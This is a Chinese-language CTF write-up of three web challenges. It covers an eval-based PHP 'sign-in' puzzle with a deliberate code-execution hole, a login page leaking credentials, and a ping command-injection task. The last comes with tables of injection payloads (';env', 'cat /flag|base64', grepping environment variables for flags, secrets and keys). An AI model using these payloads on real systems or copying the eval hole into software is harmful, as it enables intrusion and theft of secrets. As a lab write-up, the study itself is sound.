**真的是签到诶**

题目直接给了源码：
```
<?php
highlight_file(__FILE__);

$cipher = $_POST['cipher'] ?? '';

function atbash($text) {
  $result = '';
  foreach (str_split($text) as $char) {
    if (ctype_alpha($char)) {
      $is_upper = ctype_upper($char);
      $base = $is_upper ? ord('A') : ord('a');
      $offset = ord(strtolower($char)) - ord('a');
      $new_char = chr($base + (25 - $offset));
      $result .= $new_char;
    } else {
      $result .= $char;
    }
  }
  return $result;
}

if ($cipher) {
  $cipher = base64_decode($cipher);
  $encoded = atbash($cipher);
  $encoded = str_replace(' ', '', $encoded);
  $encoded = str_rot13($encoded);
  @eval($encoded);
  exit;
}

$question = "真的是签到吗？";
$answer = "真的很签到诶！";

$res =  $question . "<br>" . $answer . "<br>";
echo $res . $res . $res . $res . $res;

?>
```
这里第一块就是atbash的定义，然后后面是解码顺序，还有一个对空格的过滤，这个直接用tab键绕过就行，bake一下：

<img width="1737" height="941" alt="image" src="https://github.com/user-attachments/assets/86d53704-eadb-4eae-9638-16836b59bdbf" />

后面就不贴出来了。





**搞点哦润吉吃吃🍊**

进去之后发现是一个登录界面，稍微尝试了一下好像没啥东西，看一下源代码发现账户密码：

<img width="1259" height="203" alt="image" src="https://github.com/user-attachments/assets/b026d5f4-3447-4fbb-9330-3cd512fca8cb" />

进去之后让我们算token,提示抓包那就抓个包，看到有提示，unicode转码一下：

<img width="2413" height="986" alt="image" src="https://github.com/user-attachments/assets/ce188ecb-816d-4cd9-94a1-01f53047973f" />

session每次都是动态刷新的，来自于访问/home时的session....应该写脚本的，但我不会先跳过这里..






**DD 加速器**

依旧是ping，但是其实我ping有关的符号搞的不是很清楚，这里题目过完再重新捋一遍：

<img width="1986" height="630" alt="image" src="https://github.com/user-attachments/assets/6a845c37-de71-4ab8-ae3c-6b90a8f8f284" />

....那就找一下环境变量：

<img width="2147" height="901" alt="image" src="https://github.com/user-attachments/assets/3b01db93-b8bf-4c64-874f-9f57c24568f0" />

这里的env是列出当前 shell 的所有环境变量（比如 PATH、HOME、USER、LANG 等），确实可以看到flag在环境变量中，然后下面对几个符号再梳理一遍

1. ;（分号）—— 最常用、最直接的分隔符

作用：把两条命令串起来，前一条执行完再执行后一条，不管前面成功与否。

| 示例写法 | 实际执行的命令 | 说明 |
| --- | --- | --- |
| `127.0.0.1;env` | `ping 127.0.0.1` 然后 `env` | 最经典的注入方式，用于查看系统环境变量。 |
| `127.0.0.1;ls` | `ping 127.0.0.1` 然后 `ls` | 用于查看当前目录下的文件列表。 |
| `127.0.0.1;cat flag.php` | `ping` 然后读文件 `cat flag.php` | 直接读取名为 `flag.php` 的文件内容。 |
| `127.0.0.1;env\|grep flag` | `ping` 然后过滤含 `flag` 的环境变量 | 常用来在环境变量中查找 `FLAG=xxx` 这种形式的字符串。 |
一句话总结：; 就是“执行完前面，再执行我”。

2. &（单与号）—— 后台运行 + 继续执行

作用：把前面的命令放到后台运行，然后立刻执行后面的命令（不管前面成功与否）

| 示例写法 | 实际执行的命令 | 说明 |
| --- | --- | --- |
| `127.0.0.1 & env` | `ping 127.0.0.1 & env` | ping 在后台跑，马上执行 env |
| `127.0.0.1 & cat flag.php` | `ping` 在后台，马上 `cat` 文件 | 有时比 `;` 更隐蔽（输出可能更干净） |
| `sleep 10 & env` | `sleep 10` 秒后台跑，马上看 `env` | 测试注入是否成功 |
注意：很多 ping 程序会等前面的 ping 结束才输出，所以 & 有时能让后面的命令更快显示。

一句话总结：& 就是“前面的丢到后台去，我要马上执行后面的”。

3. &&（双与号）—— 条件成功才执行

作用：只有前面的命令执行成功（返回码 0），才执行后面的命令。

| 示例写法 | 行为说明 |
| --- | --- |
| `127.0.0.1 && env` | `ping` 成功才执行 `env`（正常 `ping` 通常成功） |
| `ls /flag && cat /flag` | 只有 `/flag` 存在才 `cat` |
| `whoami && id` | 先 `whoami`，成功再 `id` |
一句话总结：&& 就是“前面成功了才执行我”。

4. （管道）—— 把前面的输出给后面的命令

作用：把左边命令的输出，当作右边命令的输入。

| 写法示例 | 左边命令做什么 | 右边命令做什么 | 最终页面看到什么 |
| --- | --- | --- | --- |
| `env,grep flag` | `env`：输出所有环境变量 | `grep flag`：只保留含“flag”的行 | 只显示像 `FLAG=flag{xxx}` 这样的关键行 |
| `env,grep -i flag` | `env`：输出所有环境变量 | `grep -i flag`：忽略大小写搜索 | 能匹配 `flag=`、`Flag=`、`FLAG=` 等 |
| `ls,grep php` | `ls`：列出当前目录文件 | `grep php`：只显示含“php”的文件名 | 只看到 `flag.php`、`index.php` 等 |
| `ls,grep flag` | `ls`：列出文件 | `grep flag`：含“flag”的文件名 | 直接看到 `flag.php`、`flag.txt` 等 |
| `cat flag.php,base64` | `cat flag.php`：读文件内容 | `base64`：把内容转成 base64 编码 | 一串 base64 字符串（如 `ZmxhZ3t4eHh9Cg==`） |
| `cat /flag,base64` | `cat /flag`：读 /flag 文件 | `base64`：编码输出 | base64 编码的 flag 内容 |
| `ls -la,grep ^d` | `ls -la`：详细列出文件（含隐藏） | `grep ^d`：只显示以 d 开头的（目录） | 只看到目录列表 |
| `env,grep -E 'flag,secret,key'` | `env`：所有环境变量 | `grep -E`：正则匹配多个关键词 | 显示含 flag/secret/key 的环境变量 |

md表格里面搞不出管道,将就看一下


